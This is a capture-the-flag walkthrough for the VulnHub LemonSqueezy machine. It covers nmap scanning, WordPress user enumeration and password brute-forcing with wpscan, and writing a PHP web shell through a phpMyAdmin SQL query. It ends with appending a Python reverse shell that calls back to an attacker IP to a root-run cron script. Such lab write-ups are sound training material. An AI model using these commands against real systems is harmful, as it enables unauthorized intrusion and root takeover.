#LEMONSQUEEZY: 1
**Today, we'll be looking at the LemonSqueezy machine on vulnhub.
You can download the machine here:**
<https://www.vulnhub.com/entry/lemonsqueezy-1,473/>

Let's scan the machine with nmap.
```
┌──(root㉿kali)-[~]
└─# nmap -sS -A 192.168.88.136
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 10:28 EDT
Nmap scan report for 192.168.88.135
Host is up (0.00023s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:0F:4E:B3 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.88.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
```
The machine is running http only. Nothing special.

Let's use dirsearch to discover directories.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic1.png)
Interesting! The machine is running wordpress and phpmyadmin.
Let's check those out.

First, I'll try to enumerate usernames with wpscan.
```wpscan --url 192.168.88.136/wordpress -e u```
We found two users.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic2.png)

I tried searching for anything else but I didn't find anything so I brute forced the login password.

```wpscan --url 192.168.88.136/wordpress -U orange -P /usr/share/wordlists/rockyou.txt```
We got the password.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic3.png)

I then found an interesting post.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic4.png)

I then tried multiple things but after that, I tried to log into phpmyadmin with this as the password.

We got in!

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic5.png)

Now, I'll upload a shell using a SQL query.

```SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/backdoor.php"```

You can read this [article](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/) on uploading shells on phpmyadmin.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic6.png)

We can see that our shell works.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic7.png)

Now, let's try to open a reverse shell.

I'll use a python reverse shell.

We got a shell!
You can stabalize your shell with these two commands.
```python -c 'import pty; pty.spawn("/bin/bash")'```
```export TERM=xterm```

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic8.png)

Now, we move on to local enumeration.
I found an interesting file in crontab.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic9.png)

Let's check that file.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic10.png)

We can see it's a python script.
Let's add a python shell to get a root shell as that file is being run by root.

We'll use the same shell we used before but modify the port.
```echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.88.128",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' >> logrotate```

Now, set up a netcat listner and wait for the script to run.

We are root!

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/LemonSqueezy/pics/pic11.png)

